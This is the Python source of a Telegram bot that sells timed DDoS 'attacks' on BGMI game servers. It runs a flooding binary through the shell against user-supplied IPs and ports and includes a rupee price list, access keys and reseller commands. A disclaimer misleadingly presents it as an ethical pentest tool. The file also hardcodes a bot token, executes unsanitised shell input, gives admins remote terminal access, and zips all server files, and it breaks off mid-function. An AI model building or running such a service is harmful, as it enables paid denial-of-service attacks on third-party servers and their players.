import telebot
import subprocess
import datetime
import os
import time
import threading
import random
import string
import psutil
import signal
import zipfile
from typing import List, Dict

# Load bot token from environment variable or hardcode it
BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '7099053793:AAGcbJDw99PJntP5sZNioWfUYZusyJ-Q8uQ')
bot = telebot.TeleBot(BOT_TOKEN)

# Admin user IDs
admin_id = ["6683318395", ""]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# File to store keys
KEY_FILE = "keys.txt"

# Dictionary to store the approval expiry date for each user
user_approval_expiry: Dict[str, datetime.datetime] = {}

# Dictionary to store the IP addresses attacked by each user
user_attacked_ips: Dict[str, List[str]] = {}

# Dictionary to store trial users and their last attack time
trial_users: Dict[str, datetime.datetime] = {}

# Dictionary to store blocked IPs and their block expiry time
blocked_ips: Dict[str, datetime.datetime] = {}

# Dictionary to store cooldown end times for each user
user_cooldown: Dict[str, datetime.datetime] = {}

# Default maximum attack duration in seconds
MAX_ATTACK_DURATION = 240

# Default cooldown duration in seconds
DEFAULT_COOLDOWN_DURATION = 10  # 10 seconds by default

# Flag to track if an attack is currently running
is_attack_running = False

# Global variable to store the attack process
attack_process = None

# Global variable for attack command template
attack_command_template = "./NEXION {target} {port} {time} 900"

# Blocked ports
BLOCKED_PORTS = {10000, 10001, 10002, 17500, 20000, 20001, 20002, 443}


# Function to read user IDs from the file
def read_users() -> List[str]:
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to log command to the file
def log_command(user_id: str, target: str, port: int, time: int):
    user_info = bot.get_chat(user_id)
    username = f"@{user_info.username}" if user_info.username else f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to record command logs
def record_command_logs(user_id: str, command: str, target: str = None, port: int = None, time: int = None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# Function to calculate remaining approval time
def get_remaining_approval_time(user_id: str) -> str:
    expiry_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now()
        if remaining_time.days < 0:
            return "Expired"
        else:
            return str(remaining_time)
    else:
        return "N/A"

# Function to check if the user is the master admin
def is_master_admin(user_id: str) -> bool:
    return user_id == "1847934841"

# Function to add or update user approval expiry date
def set_approval_expiry_date(user_id: str, duration: int, time_unit: str) -> bool:
    current_time = datetime.datetime.now()
    if time_unit in ("hour", "hours"):
        expiry_date = current_time + datetime.timedelta(hours=duration)
    elif time_unit in ("day", "days"):
        expiry_date = current_time + datetime.timedelta(days=duration)
    elif time_unit in ("week", "weeks"):
        expiry_date = current_time + datetime.timedelta(weeks=duration)
    elif time_unit in ("month", "months"):
        expiry_date = current_time + datetime.timedelta(days=30 * duration)  # Approximation of a month
    else:
        return False
    
    user_approval_expiry[user_id] = expiry_date
    return True

# Function to clear attacked IPs daily
def clear_attacked_ips():
    while True:
        time.sleep(86400)  # 24 hours
        user_attacked_ips.clear()

# Function to clear expired blocked IPs
def clear_expired_blocked_ips():
    while True:
        time.sleep(3600)  # Check every hour
        current_time = datetime.datetime.now()
        expired_ips = [ip for ip, expiry in blocked_ips.items() if expiry < current_time]
        for ip in expired_ips:
            del blocked_ips[ip]

# Start the thread to clear attacked IPs
threading.Thread(target=clear_attacked_ips, daemon=True).start()

# Start the thread to clear expired blocked IPs
threading.Thread(target=clear_expired_blocked_ips, daemon=True).start()

# Function to generate a random key
def generate_key(duration: str, user_limit: str) -> str:
    # Generate a random 10-character key
    key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
    # Save the key, its duration, and user limit to the keys file
    with open(KEY_FILE, "a") as file:
        file.write(f"{key}:{duration}:{user_limit}\n")
    return key

# Function to redeem a key
def redeem_key(user_id: str, key: str) -> bool:
    try:
        with open(KEY_FILE, "r") as file:
            keys = file.read().splitlines()
        
        for line in keys:
            stored_key, duration, user_limit = line.split(":")
            if stored_key == key:
                # Remove the key from the file
                keys.remove(line)
                with open(KEY_FILE, "w") as file:
                    for remaining_key in keys:
                        file.write(f"{remaining_key}\n")
                
                # Set the approval expiry date based on the key's duration
                if "day" in duration:
                    days = int(duration.replace("day", ""))
                    set_approval_expiry_date(user_id, days, "days")
                elif "hour" in duration:
                    hours = int(duration.replace("hour", ""))
                    set_approval_expiry_date(user_id, hours, "hours")
                
                # Add the user to the allowed users list
                allowed_user_ids = read_users()
                if user_id not in allowed_user_ids:
                    allowed_user_ids.append(user_id)
                    with open(USER_FILE, "a") as file:
                        file.write(f"{user_id}\n")
                
                return True
    except FileNotFoundError:
        pass
    return False

# Function to get real CPU, memory, and data usage
def get_system_usage():
    cpu_usage = psutil.cpu_percent(interval=1)  # CPU usage in %
    memory_info = psutil.virtual_memory()  # Memory usage in MB
    memory_usage = memory_info.used / (1024 * 1024)  # Convert bytes to MB
    network_info = psutil.net_io_counters()  # Data usage in MB
    data_used = (network_info.bytes_sent + network_info.bytes_recv) / (1024 * 1024)  # Convert bytes to MB
    
    return cpu_usage, memory_usage, data_used

# Command handler for adding an admin
@bot.message_handler(commands=['addadmin'])
def add_admin(message):
    user_id = str(message.chat.id)
    if user_id in admin_id or is_master_admin(user_id):
        command = message.text.split()
        if len(command) > 1:
            new_admin_id = command[1]
            if new_admin_id not in admin_id:
                admin_id.append(new_admin_id)
                response = f"✅ Admin {new_admin_id} added successfully."
            else:
                response = "❌ User is already an admin."
        else:
            response = "Please specify a user ID to add as admin."
    else:
        response = "Only admins can add other admins."

    bot.reply_to(message, response)

# Command handler for removing an admin
@bot.message_handler(commands=['removeadmin'])
def remove_admin(message):
    user_id = str(message.chat.id)
    if is_master_admin(user_id):  # Only master admin can remove admins
        command = message.text.split()
        if len(command) > 1:
            admin_to_remove = command[1]
            if admin_to_remove in admin_id:
                admin_id.remove(admin_to_remove)
                response = f"✅ Admin {admin_to_remove} removed successfully."
            else:
                response = "❌ User is not an admin."
        else:
            response = "Please specify a user ID to remove as admin."
    else:
        response = "❌ Only the master admin can remove admins."

    bot.reply_to(message, response)

# Command handler for trial attacks
@bot.message_handler(commands=['trial'])
def trial_attack(message):
    user_id = str(message.chat.id)
    
    # Check if the user has already performed a successful trial attack today
    if user_id in trial_users:
        last_attack_time = trial_users[user_id]
        if (datetime.datetime.now() - last_attack_time).days < 1:  # 1 attack per day
            response = "❌ You can only perform one trial attack per day."
            bot.reply_to(message, response)
            return

    command = message.text.split()
    if len(command) == 4:  # Updated to accept target, time, and port
        target = command[1]
        port = int(command[2])  # Convert port to integer
        time = int(command[3])  # Convert time to integer

        # Check if the target IP is banned
        if target == "1.1.1.1":
            response = "❌ This IP is banned."
            bot.reply_to(message, response)
            return

        # Check if the port is blocked
        if port in BLOCKED_PORTS:
            response = "❌ This port is blocked."
            bot.reply_to(message, response)
            return

        if time > MAX_ATTACK_DURATION:
            response = f"Error: Time interval must be less than {MAX_ATTACK_DURATION}."
            bot.reply_to(message, response)
        else:
            # Record the attack
            record_command_logs(user_id, '/trial', target, port, time)
            log_command(user_id, target, port, time)
            start_attack_reply(message, target, port, time)  # Call start_attack_reply function
            full_command = attack_command_template.format(target=target, port=port, time=time)
            process = subprocess.run(full_command, shell=True)

            # Check if the attack was successful
            if process.returncode == 0:  # Attack successful
                # Block the IP for 24 hours
                blocked_ips[target] = datetime.datetime.now() + datetime.timedelta(hours=24)

                # Get real system usage
                cpu_usage, memory_usage, data_used = get_system_usage()

                # Send the final response
                response = f"✅ Attack Completed Successfully\n🖥 CPU Usage: {cpu_usage:.2f}%\n🧠 Memory Usage: {memory_usage:.2f} MB\n📊 Data Used: {data_used:.2f} MB\n\n⏳ You have 5 minutes to submit a screenshot of the attack feedback."
                bot.reply_to(message, response)

                # Record the successful trial attack time
                trial_users[user_id] = datetime.datetime.now()
            else:  # Attack failed
                response = "❌ Attack failed. Please try again."
                bot.reply_to(message, response)
    else:
        response = "⚔️ Usage ⚔️- /trial <target> <port> <time>"  # Updated command syntax
        bot.reply_to(message, response)

# Command handler for changing max attack duration
@bot.message_handler(commands=['uptime'])
def change_max_duration(message):
    user_id = str(message.chat.id)
    if user_id in admin_id or is_master_admin(user_id):
        command = message.text.split()
        if len(command) > 1:
            try:
                new_duration = int(command[1])
                if new_duration > 0:
                    global MAX_ATTACK_DURATION
                    MAX_ATTACK_DURATION = new_duration
                    response = f"✅ Max attack duration changed to {new_duration} seconds."
                else:
                    response = "❌ Duration must be a positive integer."
            except ValueError:
                response = "❌ Invalid duration format. Please provide a positive integer."
        else:
            response = "Please specify a new max attack duration."
    else:
        response = "Only admins can change the max attack duration."

    bot.reply_to(message, response)

# Command handler for removing a key
@bot.message_handler(commands=['removekey'])
def remove_key(message):
    user_id = str(message.chat.id)
    if user_id in admin_id or is_master_admin(user_id):
        command = message.text.split()
        if len(command) > 1:
            key_to_remove = command[1]
            try:
                with open(KEY_FILE, "r") as file:
                    keys = file.read().splitlines()
                
                key_found = False
                for line in keys:
                    stored_key, duration, user_limit = line.split(":")
                    if stored_key == key_to_remove:
                        keys.remove(line)
                        key_found = True
                        break
                
                if key_found:
                    with open(KEY_FILE, "w") as file:
                        for remaining_key in keys:
                            file.write(f"{remaining_key}\n")
                    response = f"✅ Key {key_to_remove} removed successfully."
                else:
                    response = "❌ Key not found."
            except FileNotFoundError:
                response = "❌ No keys found to remove."
        else:
            response = "Please specify a key to remove."
    else:
        response = "Only admins can remove keys."

    bot.reply_to(message, response)

# Command handler for generating a key
@bot.message_handler(commands=['gen'])
def generate_key_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id or is_master_admin(user_id):
        command = message.text.split()
        if len(command) > 2:
            duration = command[1]
            user_limit = command[2]
            if "day" in duration or "hour" in duration:
                key = generate_key(duration, user_limit)
                response = f"✅ Key generated: <code>{key}</code>\nDuration: {duration}\nUser Limit: {user_limit}"
            else:
                response = "Invalid duration format. Use '1day' or '2hours'."
        else:
            response = "Please specify a duration and user limit (e.g., 1day 1person)."
    else:
        response = "Only admins can generate keys."

    bot.reply_to(message, response, parse_mode="HTML")

# Command handler for redeeming a key
@bot.message_handler(commands=['redeem'])
def redeem_key_command(message):
    user_id = str(message.chat.id)
    command = message.text.split()
    if len(command) > 1:
        key = command[1]
        if redeem_key(user_id, key):
            response = f"✅ Key redeemed successfully! Your access will expire on {user_approval_expiry[user_id].strftime('%Y-%m-%d %H:%M:%S')}."
        else:
            response = "❌ Invalid or expired key."
    else:
        response = "Please provide a key to redeem."

    bot.reply_to(message, response)

# Command handler for adding a user with approval time
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id or is_master_admin(user_id):
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            duration_str = command[2]

            try:
                duration = int(duration_str[:-4])  # Extract the numeric part of the duration
                if duration <= 0:
                    raise ValueError
                time_unit = duration_str[-4:].lower()  # Extract the time unit (e.g., 'hour', 'day', 'week', 'month')
                if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
                    raise ValueError
            except ValueError:
                response = "Invalid duration format. Please provide a positive integer followed by 'hour(s)', 'day(s)', 'week(s)', or 'month(s)'."
                bot.reply_to(message, response)
                return

            allowed_user_ids = read_users()
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                if set_approval_expiry_date(user_to_add, duration, time_unit):
                    response = f"User {user_to_add} added successfully for {duration} {time_unit}. Access will expire on {user_approval_expiry[user_to_add].strftime('%Y-%m-%d %H:%M:%S')} 👍."
                else:
                    response = "Failed to set approval expiry date. Please try again later."
            else:
                response = "User already exists 🤦‍♂️."
        else:
            response = "Please specify a user ID and the duration (e.g., 1hour, 2days, 3weeks, 4months) to add 😘."
    else:
        response = "You have not purchased yet. Purchase now from:- @police_Ji"

    bot.reply_to(message, response)

# Command handler for retrieving user info
@bot.message_handler(commands=['myinfo'])
def get_user_info(message):
    user_id = str(message.chat.id)
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else "N/A"
    user_role = "Admin" if user_id in admin_id else "User"
    remaining_time = get_remaining_approval_time(user_id)
    response = f"👤 Your Info:\n\n🆔 User ID: <code>{user_id}</code>\n📝 Username: {username}\n🔖 Role: {user_role}\n📅 Approval Expiry Date: {user_approval_expiry.get(user_id, 'Not Approved')}\n⏳ Remaining Approval Time: {remaining_time}"
    bot.reply_to(message, response, parse_mode="HTML")

# Command handler for removing a user
@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id or is_master_admin(user_id):
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            allowed_user_ids = read_users()
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = f"User {user_to_remove} not found in the list ❌."
        else:
            response = "Please specify a user ID to remove."
    else:
        response = "You have not purchased yet. Purchase now from:- @police_Ji 🙇."

    bot.reply_to(message, response)

# Command handler for clearing logs
@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id or is_master_admin(user_id):
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found ❌."
                else:
                    file.truncate(0)
                    response = "Logs cleared successfully ✅"
        except FileNotFoundError:
            response = "No logs found to clear."
    else:
        response = "You have not purchased yet. Purchase now from:- @NEXION_OWNER ❄."

    bot.reply_to(message, response)

# Command handler for clearing users
@bot.message_handler(commands=['clearusers'])
def clear_users_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id or is_master_admin(user_id):
        try:
            with open(USER_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Users are already cleared. No data found ❌."
                else:
                    file.truncate(0)
                    response = "Users cleared successfully ✅"
        except FileNotFoundError:
            response = "No users found to clear."
    else:
        response = "You have not purchased yet. Purchase now from:- @police_Ji 🙇."

    bot.reply_to(message, response)

# Command handler for showing all users
@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id or is_master_admin(user_id):
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found ❌"
        except FileNotFoundError:
            response = "No data found ❌"
    else:
        response = "You have not purchased yet. Purchase now from:- @police_Ji ❄."

    bot.reply_to(message, response)

# Command handler for showing recent logs
@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id or is_master_admin(user_id):
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found 🔴."
                bot.reply_to(message, response)
        else:
            response = "No data found 🔴"
            bot.reply_to(message, response)
    else:
        response = "You have not purchased yet. Purchase now from:- @police_Ji ❄."
        bot.reply_to(message, response)

# Function to handle the reply when users run the /attack command
def start_attack_reply(message, target: str, port: int, time: int):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"🚀𝙃𝙞 {username} 🚀, 𝘼𝙩𝙩𝙖𝙘𝙠 𝙨𝙩𝙖𝙧𝙩𝙚𝙙 𝙤𝙣 {target} : {port} 𝙛𝙤𝙧 {time} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨\n\n❗️❗️ 𝙋𝙇𝙀𝘼𝙎𝙚 𝙎𝙚𝙣𝙙 𝙁𝙚𝙚𝘿𝙗𝙖𝙘𝙠 ❗️❗️"
    bot.reply_to(message, response)

# Handler for /attack command
@bot.message_handler(commands=['attack'])
def handle_bgmi(message):
    global is_attack_running, attack_process, attack_command_template
    user_id = str(message.chat.id)
    allowed_user_ids = read_users()
    if user_id in allowed_user_ids:
        # Check if the user is in cooldown
        if user_id in user_cooldown and datetime.datetime.now() < user_cooldown[user_id]:
            remaining_time = user_cooldown[user_id] - datetime.datetime.now()
            response = f"❌ You are in cooldown. Please wait {remaining_time.seconds} seconds before starting another attack."
            bot.reply_to(message, response)
            return

        # Check if an attack is already running
        if is_attack_running:
            response = "❌ An attack is already running. Please wait until it is completed."
            bot.reply_to(message, response)
            return

        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer

            # Check if the target IP is banned
            if target == "1.1.1.1":
                response = "❌ This IP is banned."
                bot.reply_to(message, response)
                return

            # Check if the port is blocked
            if port in BLOCKED_PORTS:
                response = "❌ This port is blocked."
                bot.reply_to(message, response)
                return

            # Check if the IP is blocked
            if target in blocked_ips:
                if datetime.datetime.now() < blocked_ips[target]:
                    response = f"❌ This IP ({target}) is blocked for 24 hours after a successful attack."
                    bot.reply_to(message, response)
                    return
                else:
                    # Remove the IP from the blocked list if the block has expired
                    del blocked_ips[target]

            # Check if the user has already attacked this IP
            if user_id in user_attacked_ips and target in user_attacked_ips[user_id]:
                response = f"❌ You have already attacked {target}. You can only attack an IP once."
                bot.reply_to(message, response)
                return

            if time > MAX_ATTACK_DURATION:
                response = f"Error: Time interval must be less than {MAX_ATTACK_DURATION}."
                bot.reply_to(message, response)
            else:
                # Set the attack running flag
                is_attack_running = True

                # Record the attack
                record_command_logs(user_id, '/attack', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = attack_command_template.format(target=target, port=port, time=time)
                attack_process = subprocess.Popen(full_command, shell=True, preexec_fn=os.setsid)  # Store the process

                # Check if the attack was successful
                if attack_process.wait() == 0:  # Attack successful
                    # Block the IP for 24 hours
                    blocked_ips[target] = datetime.datetime.now() + datetime.timedelta(hours=24)

                    # Get real system usage
                    cpu_usage, memory_usage, data_used = get_system_usage()

                    # Send the final response
                    response = f"✅ Attack Completed Successfully\n🖥 CPU Usage: {cpu_usage:.2f}%\n🧠 Memory Usage: {memory_usage:.2f} MB\n📊 Data Used: {data_used:.2f} MB\n\n⏳ You have 5 minutes to submit a screenshot of the attack feedback."
                    bot.reply_to(message, response)

                    # Set cooldown for the user
                    user_cooldown[user_id] = datetime.datetime.now() + datetime.timedelta(seconds=DEFAULT_COOLDOWN_DURATION)
                else:  # Attack failed
                    response = "❌ Attack failed. Please try again."
                    bot.reply_to(message, response)

                # Reset the attack running flag
                is_attack_running = False
        else:
            response = "⚔️ Usage ⚔️- /attack <target> <port> <time>"  # Updated command syntax
            bot.reply_to(message, response)
    else:
        response = ("☢️ Unauthorized Access! 🚫\n\n DM TO BUY ACCESS:- @police_Ji")
        bot.reply_to(message, response)

# Command handler for showing user logs
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    allowed_user_ids = read_users()
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "☣️ No Command Logs Found For You ☢️."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "You Are Not Authorized To Use This Command 😡."

    bot.reply_to(message, response)

# Command handler for showing help
@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''🔰 Available commands 🔰:
    
🔘 **/attack**  
   - **Description**: Method for attacking BGMI servers.  
   
🔮 **/rules**  
   - **Description**: Check the rules before using the bot.   

🔘 **/mylogs**  
   - **Description**: View your recent attack logs.  

🔮 **/plan**  
   - **Description**: Check the botnet rates and plans. 

🔘 **/myinfo**  
   - **Description**: View your user information (ID, username, role, approval status, etc.).  

🟢 **/trial**  
   - **Description**: Perform a trial attack (limited to 1 attack every 7 days). 

🔮 **/redeem <key>**  
   - **Description**: Redeem a key to gain access to the bot.  
   - **Usage**: `/redeem ABC123DEF45` 
   
♻️ To See Admin Commands:
👑 /admincmd : Shows All Admin Commands.

Buy From :- @police_Ji
Devloper :- @NEXION_OWNER
Official Channel :- https://t.me/NEXION_Gaming
'''
    bot.reply_to(message, help_text)

# Command handler for starting the bot
@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f''' Hi {user_name} 🔰

🔍 PenTest Bot - Your Ultimate Cybersecurity Companion!

✨ Features:
✅ Network & Web Application Scanning
✅ Automated Security Testing
✅ Exploit Detection & Reporting
✅ User-Friendly & Fast Execution

⚠️ Disclaimer: This bot is intended for ethical use only. Always obtain permission before testing any system.

♻️Try To Run This Command : /help 
✅BUY :- @police_Ji'''
    bot.reply_to(message, response)

# Command handler for showing rules
@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules ⚠️:

1. Don't Run Too Many Attacks !! Cause A Ban From Bot
2. Don't Run 2 Attacks At Same Time Because You Will Get Banned From Bot.
3. MAKE SURE YOU JOINED https://t.me/NEXION_GAMEING OTHERWISE IT WILL NOT WORK
4. We Daily Check The Logs So Follow These Rules To Avoid Ban!!'''
    bot.reply_to(message, response)

# Command handler for showing plans
@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Brother Only 1 Plan Is Powerful Than Any Other Ddos !!:

⚜️ Vip ⚜️ :
-> Attack Time : 240 (S)
> After Attack Limit : 10 sec
-> Concurrents Attack : 5

Pr-ice List💸 :
     🚀1𝐃𝐀𝐘 💠 ₹150  ✅
     🚀3𝐃𝐀𝐘 💠 ₹250  ✅
     🚀7𝐃𝐀𝐘  💠 ₹550  ✅
     🚀30𝐃𝐀𝐘 💠 ₹1600 ✅
'''
    bot.reply_to(message, response)

# Command handler for showing admin commands
@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

1. **/addadmin <user_id>**  
   - Adds a new admin to the bot.  

2. **/removeadmin <user_id>**  
   - Removes an admin from the bot.  
   - Only the master admin can remove admins.

3. **/add <user_id> <duration>**  
   - Adds a user with a specified approval duration (e.g., `1hour`, `2days`, `3weeks`, `4months`).

4. **/remove <user_id>**  
   - Removes a user from the authorized list.

5. **/allusers**  
   - Displays a list of all authorized users.

6. **/logs**  
   - Sends the log file containing all attack records.

7. **/clearlogs**  
   - Clears the log file.

8. **/clearusers**  
   - Clears the list of authorized users.

9. **/gen <duration> <user_limit>**  
   - Generates a key for access (e.g., `1day 1person`).

10. **/removekey <key>**  
    - Removes a specific key from the keys file.

11. **/uptime <duration>**  
    - Changes the maximum attack duration in seconds.

12. **/broadcast <message>**  
    - Sends a broadcast message to all authorized users.

13. **/cooldown <seconds>**  
    - Sets the cooldown duration between attacks.

14. **/stop**  
    - Stops the currently running attack.

15. **/alladmin**  
    - Displays a list of all admins.

16. **/upload**  
    - Allows admins to upload files to the bot's server.

17. **/parth ./vps ip port time**  
    - Updates the attack command template used for launching attacks.

18. **/terminal**  
    - Allows admins to execute terminal commands on the VPS.

19. **/alllfile**  
   - Sends the all file of vps (only for master admin)

'''
    bot.reply_to(message, response)

# Command handler for broadcasting a message
@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id or is_master_admin(user_id):
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users 👍."
        else:
            response = "🔁 Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This Command ☣️."

    bot.reply_to(message, response)

# Command handler for setting cooldown duration
@bot.message_handler(commands=['cooldown'])
def set_cooldown(message):
    user_id = str(message.chat.id)
    if user_id in admin_id or is_master_admin(user_id):
        command = message.text.split()
        if len(command) > 1:
            try:
                new_cooldown = int(command[1])
                if new_cooldown > 0:
                    global DEFAULT_COOLDOWN_DURATION
                    DEFAULT_COOLDOWN_DURATION = new_cooldown
                    response = f"✅ Cooldown duration changed to {new_cooldown} seconds."
                else:
                    response = "❌ Cooldown duration must be a positive integer."
            except ValueError:
                response = "❌ Invalid cooldown format. Please provide a positive integer."
        else:
            response = "Please specify a new cooldown duration in seconds."
    else:
        response = "Only admins can change the cooldown duration."

    bot.reply_to(message, response)

# Command handler for stopping the attack
@bot.message_handler(commands=['stop'])
def stop_attack(message):
    global attack_process
    user_id = str(message.chat.id)
    if user_id in admin_id or is_master_admin(user_id):
        if attack_process:
            attack_process.send_signal(signal.SIGINT)  # Send Ctrl+C signal
            attack_process = None
            bot.reply_to(message, "✅ Attack stopped successfully.")
        else:
            bot.reply_to(message, "❌ No attack is currently running.")
    else:
        bot.reply_to(message, "❌ Only admins can stop attacks.")

# Command handler for showing all admins
@bot.message_handler(commands=['alladmin'])
def show_all_admins(message):
    user_id = str(message.chat.id)
    if user_id in admin_id or is_master_admin(user_id):
        response = "🛡️ Admins:\n"
        for admin in admin_id:
            response += f"- {admin}\n"
        bot.reply_to(message, response)
    else:
        bot.reply_to(message, "❌ Only admins can view the admin list.")

# Command handler for uploading files
@bot.message_handler(commands=['upload'])
def request_file_upload(message):
    bot.reply_to(message, "📤 Please send the file you want to upload.")

@bot.message_handler(content_types=['document'])
def handle_file_upload(message):
    user_id = str(message.chat.id)
    if user_id in admin_id or is_master_admin(user_id):
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        # Save the file to the VPS
        file_name = message.document.file_name
        with open(file_name, 'wb') as new_file:
            new_file.write(downloaded_file)
        
        bot.reply_to(message, f"✅ File '{file_name}' uploaded successfully.")
    else:
        bot.reply_to(message, "❌ Only admins can upload files.")

# Command handler for setting attack path
@bot.message_handler(commands=['parth'])
def set_attack_path(message):
    user_id = str(message.chat.id)
    if user_id in admin_id or is_master_admin(user_id):
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            global attack_command_template
            attack_command_template = command[1]
            bot.reply_to(message, f"✅ Attack command template updated to: {attack_command_template}")
        else:
            bot.reply_to(message, "❌ Please provide a new attack command template.")
    else:
        bot.reply_to(message, "❌ Only admins can change the attack command template.")

# Command handler for terminal access
@bot.message_handler(commands=['terminal'])
def handle_terminal(message):
    user_id = str(message.chat.id)
    if user_id in admin_id or is_master_admin(user_id):
        bot.reply_to(message, "🖥 Enter your terminal command:")
        bot.register_next_step_handler(message, process_terminal_command)
    else:
        bot.reply_to(message, "❌ Only admins can use the terminal.")

def process_terminal_command(message):
    user_id = str(message.chat.id)
    command = message.text

    try:
        # Execute the command on the VPS
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout if result.stdout else result.stderr

        # Send the output back to the user
        bot.reply_to(message, f"✅ Command executed:\n\n{command}\n\nOutput:\n{output}")
    except Exception as e:
        bot.reply_to(message, f"❌ Error executing command: {str(e)}")

# Command handler for reselling access
@bot.message_handler(commands=['resell'])
def handle_resell(message):
    user_id = str(message.chat.id)
    if user_id in admin_id or is_master_admin(user_id):
        command = message.text.split()
        if len(command) == 3:
            user_to_add = command[1]
            duration_str = command[2]

            try:
                duration = int(duration_str[:-4])  # Extract the numeric part of the duration
                time_unit = duration_str[-4:].lower()  # Extract the time unit (e.g., 'hour', 'day')

                if time_unit not in ('hour', 'hours', 'day', 'days'):
                    raise ValueError

                # Add the user with the specified duration
                if set_approval_expiry_date(user_to_add, duration, time_unit):
                    allowed_user_ids = read_users()
                    if user_to_add not in allowed_user_ids:
                        allowed_user_ids.append(user_to_add)
                        with open(USER_FILE, "a") as file:
                            file.write(f"{user_to_add}\n")

                    # Notify the master admin
                    master_admin_id = "1847934841"  # Replace with the actual master admin ID
                    bot.send_message(master_admin_id, f"🔄 Reseller {user_id} added user {user_to_add} for {duration} {time_unit}.")

                    bot.reply_to(message, f"✅ User {user_to_add} added successfully for {duration} {time_unit}.")
                else:
                    bot.reply_to(message, "❌ Failed to set approval expiry date.")
            except ValueError:
                bot.reply_to(message, "❌ Invalid duration format. Use '1hour' or '1day'.")
        else:
            bot.reply_to(message, "⚙️ Usage: /resell <user_id> <duration> (e.g., /resell 12345 1day)")
    else:
        bot.reply_to(message, "❌ Only resellers and admins can use this command.")

# Command handler for downloading all files
@bot.message_handler(commands=['alllfile'])
def download_all_files(message):
    user_id = str(message.chat.id)
    
    # Check if the user is the master admin
    if is_master_admin(user_id):
        # Create a temporary zip file
        zip_filename = "all_files.zip"
        with zipfile.ZipFile(zip_filename, 'w') as zipf:
            # Add all files in the current directory to the zip archive
            for root, dirs, files in os.walk("."):
                for file in files:
                    file_path = os.path.join(root, file)
                    zipf.write(file_path, os.path.relpath(file_path, "."))
        
        # Check if the zip file was created successfully
        if os.path.exists(zip_filename):
            # Send the zip file to the user
            with open(zip_filename, 'rb') as file:
